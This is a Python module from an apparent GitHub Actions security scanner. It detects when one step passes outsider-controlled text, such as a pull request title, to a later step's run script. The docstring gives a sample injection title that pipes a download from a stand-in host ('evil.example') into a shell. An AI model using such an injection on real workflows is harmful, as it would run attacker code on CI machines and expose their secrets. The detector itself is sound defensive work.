"""Values passed from one step to a LATER step of the same job.

Steps of one job share a machine, so a step can hand a value to a later step
through an output:

    steps:
      - id: read                                  # the source step has an id
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "title=$TITLE" >> "$GITHUB_OUTPUT"
      - run: echo "${{ steps.read.outputs.title }}"   # a later step pastes it

Reading the title through ``env`` is safe in the source step. Pasting the
output into the later command is not: GitHub substitutes the text before the
shell starts, so a title such as ``"; curl evil.example | sh; "`` becomes shell
code.

A flow is reported only when all of these show in the file:

1. the later step pastes ``steps.<id>.outputs...`` into a ``run`` script (or a
   github-script ``script``), and not merely compares it;
2. ``<id>`` belongs to a step EARLIER in the same job (GitHub gives a step no
   outputs of later steps or of other jobs);
3. that earlier step is a ``run`` step that writes to ``$GITHUB_OUTPUT`` (or
   uses ``::set-output``);
4. the line that writes THAT output (``name=value``) carries outsider text:
   it pastes an outsider-controlled field, or it uses a shell variable that
   the step's ``env`` (or an earlier line) filled with one, or it uses an
   output that itself carries outsider text. For the multi-line form
   (``name<<EOF``) the value is on later lines, so the output is accused if
   the step handles outsider text anywhere.

Not assumed: that every step output is dangerous. A step with several outputs
is judged output by output. A value that comes from a command
(``$(...)``) is unknown and not accused. An output of an action
(``uses:``) is left alone because the file does not show what it contains.

Known misses (see the tests): outsider text reaching a step only through a job
or workflow ``env``; an output name built at run time; a script that builds
the whole ``name=value`` text in a variable (``echo "$LINE" >> $GITHUB_OUTPUT``);
a value read from a file or a command; an unquoted or multi-line expression.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Any

import yaml

from . import expressions
from .text import clean

# The two ways a step can set an output.
WRITES_OUTPUT = re.compile(r"GITHUB_OUTPUT|::set-output", re.IGNORECASE)


@dataclass(frozen=True)
class StepFlow:
    """Evidence for one source-to-sink flow. Text fields are already cleaned."""

    job: str
    source_step: str  # the id of the step that sets the output
    source_position: int  # its place in the job, counting from 1
    output: str | None  # None when the reference reads all outputs
    origin: str  # where the outsider text comes from
    sink_position: int  # the later step that pastes it
    reference: str  # what it pastes, e.g. steps.read.outputs.title


def _texts(node: Any) -> list[str]:
    """Every string inside a value."""
    if isinstance(node, str):
        return [node]
    if isinstance(node, dict):
        return [s for v in node.values() for s in _texts(v)]
    if isinstance(node, list):
        return [s for v in node for s in _texts(v)]
    return []


def _part(path: expressions.Path, index: int) -> str | None:
    if index >= len(path):
        return None
    part = path[index]
    return part.lower() if part is not None else None


@dataclass(frozen=True)
class _Source:
    position: int
    step_id: str  # as written, for display
    outputs: dict[str, str]  # lower-case output name -> where its outsider text comes from


def _sink_texts(step: dict[str, Any]) -> list[str]:
    """The texts of a step in which ``${{ }}`` is substituted into code."""
    texts: list[str] = []
    run = step.get("run")
    if isinstance(run, str):
        texts.append(run)
    uses = step.get("uses")
    with_ = step.get("with")
    if (
        isinstance(uses, str)
        and uses.split("@", 1)[0].lower() == "actions/github-script"
        and isinstance(with_, dict)
        and isinstance(with_.get("script"), str)
    ):
        texts.append(with_["script"])
    return texts


def _reference_text(path: expressions.Path) -> str:
    return clean(".".join(str(part) if part is not None else "[...]" for part in path))


def _carried(
    path: expressions.Path, sources: dict[str, _Source]
) -> tuple[_Source, str | None, str] | None:
    """If this reference reads an output of a known source step.

    Returns the step, the output name (None for all outputs) and the origin.
    """
    if _part(path, 0) != "steps" or _part(path, 2) != "outputs":
        return None
    step_id = _part(path, 1)
    source = sources.get(step_id) if step_id is not None else None
    if source is None:
        return None
    output = path[3] if len(path) > 3 else None
    if output is None or output == "*":
        return source, None, next(iter(source.outputs.values()))  # all, or chosen at run time
    origin = source.outputs.get(output.lower())
    if origin is None:
        return None  # the step never writes outsider text to an output of this name
    return source, output, origin


# $NAME or ${NAME}
_SHELL_VAR = re.compile(r"\$(?:\{(\w+)[^}]*\}|(\w+))")
# a line that is a plain shell assignment:  NAME=value
_ASSIGN = re.compile(r"^\s*(?:export\s+)?(\w+)=(.*)$")
# writing an output:  name=value   name<<DELIMITER   or  ::set-output name=NAME::value
_OUTPUT_WRITE = re.compile(
    r"::set-output\s+name=(?P<n1>[\w-]+)::|(?<![\w$.-])(?P<n2>[A-Za-z_][\w-]*)(?P<op>=(?!=)|<<)"
)


def _origin_in_value(
    value: str, tainted: dict[str, str], sources: dict[str, _Source]
) -> str | None:
    """Where outsider text enters this piece of a script or env value, if it does."""
    for path in expressions.pasted_references(value):
        if expressions.is_untrusted(path):
            return _reference_text(path)
        hit = _carried(path, sources)
        if hit is not None:
            return f"{_reference_text(path)} (from step {hit[0].position})"
    for match in _SHELL_VAR.finditer(value):
        name = match.group(1) or match.group(2)
        if name in tainted:
            return tainted[name]
    return None


def _source_outputs(step: dict[str, Any], sources: dict[str, _Source]) -> dict[str, str]:
    """The outputs of this step that carry outsider text: name -> where it comes from."""
    run = step.get("run")
    if not isinstance(run, str) or not WRITES_OUTPUT.search(run):
        return {}

    # Shell variables the step's env fills with outsider text.
    tainted: dict[str, str] = {}
    env = step.get("env")
    for key, value in env.items() if isinstance(env, dict) else []:
        if isinstance(value, str):
            origin = _origin_in_value(value, {}, sources)
            if origin is not None:
                tainted[str(key)] = origin

    # Used only for the multi-line form, where the value is on later lines.
    anywhere = _origin_in_value(run, tainted, sources) or next(iter(tainted.values()), None)

    outputs: dict[str, str] = {}
    for line in run.splitlines():
        assignment = _ASSIGN.match(line)
        if assignment is not None:  # a local variable, not an output
            origin = _origin_in_value(assignment.group(2), tainted, sources)
            if origin is not None:
                tainted[assignment.group(1)] = origin
            continue
        writes = list(_OUTPUT_WRITE.finditer(line))
        for i, match in enumerate(writes):
            end = writes[i + 1].start() if i + 1 < len(writes) else len(line)
            if match.group("n1"):
                name, origin = (
                    match.group("n1"),
                    _origin_in_value(line[match.end() : end], tainted, sources),
                )
            elif match.group("op") == "<<":
                name, origin = match.group("n2"), anywhere
            else:
                name, origin = (
                    match.group("n2"),
                    _origin_in_value(line[match.end() : end], tainted, sources),
                )
            if origin is not None:
                outputs[name.lower()] = origin
    return outputs


def step_flows(job_name: str, job: Any) -> list[StepFlow]:
    """Every source-to-sink flow between ordered steps of one job."""
    steps = job.get("steps") if isinstance(job, dict) else None
    if not isinstance(steps, list):
        return []

    sources: dict[str, _Source] = {}  # lower-case step id -> what it carries
    flows: list[StepFlow] = []
    seen: set[tuple[int, str]] = set()

    for position, step in enumerate(steps, start=1):
        if not isinstance(step, dict):
            continue

        # Sink: does this step paste an output of an EARLIER source step?
        for text in _sink_texts(step):
            for path in expressions.pasted_references(text):
                hit = _carried(path, sources)
                if hit is None:
                    continue
                source, output, origin = hit
                reference = _reference_text(path)
                if (position, reference) in seen:
                    continue
                seen.add((position, reference))
                flows.append(
                    StepFlow(
                        job=job_name,
                        source_step=clean(source.step_id),
                        source_position=source.position,
                        output=clean(output) if output is not None else None,
                        origin=origin,
                        sink_position=position,
                        reference=reference,
                    )
                )

        # Source: does this step put outsider text into an output of its own?
        step_id = step.get("id")
        if isinstance(step_id, str):  # no id: nobody can read its outputs
            outputs = _source_outputs(step, sources)
            if outputs:
                sources[step_id.lower()] = _Source(position, step_id, outputs)

    return flows


def flows_in(text: str | None) -> list[StepFlow]:
    """Every flow in one workflow file. Unreadable or empty text gives []."""
    if not text:
        return []
    doc = yaml.safe_load(text)
    jobs = doc.get("jobs") if isinstance(doc, dict) else None
    if not isinstance(jobs, dict):
        return []
    found: list[StepFlow] = []
    for name, job in jobs.items():
        found += step_flows(clean(name), job)
    return found
